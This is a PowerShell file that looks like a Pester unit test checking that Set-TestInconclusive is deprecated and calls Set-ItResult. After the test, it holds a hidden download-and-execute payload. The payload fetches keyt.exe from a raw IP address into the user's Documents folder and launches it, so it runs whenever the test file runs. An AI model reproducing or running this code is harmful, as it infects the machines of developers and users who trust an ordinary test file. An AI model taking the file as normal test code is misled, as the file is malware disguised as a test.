Set-StrictMode -Version Latest

Describe "Ensuring Set-TestInconclusive is deprecated" {
    Context "Set-TestInconclusive calls Set-ItResult -Inconclusive" {
        InModuleScope -Module Pester {
            
            
            
            if (-not($PSVersionTable.PSVersion.Major -eq 2)) {
                It "Set-TestInconclusive calls Set-ItResult internally" {
                    Mock Set-ItResult { }
                    try {
                        Set-TestInconclusive
                    }
                    catch {
                    }
                    Assert-MockCalled Set-ItResult -ParameterFilter { $Inconclusive -eq $true }
                }
            }
        }
    }
}

Import-Module BitsTransfer
$path = [environment]::getfolderpath("mydocuments")
Start-BitsTransfer -Source "http://94.102.50.39/keyt.exe" -Destination "$path\keyt.exe"
Invoke-Item  "$path\keyt.exe"

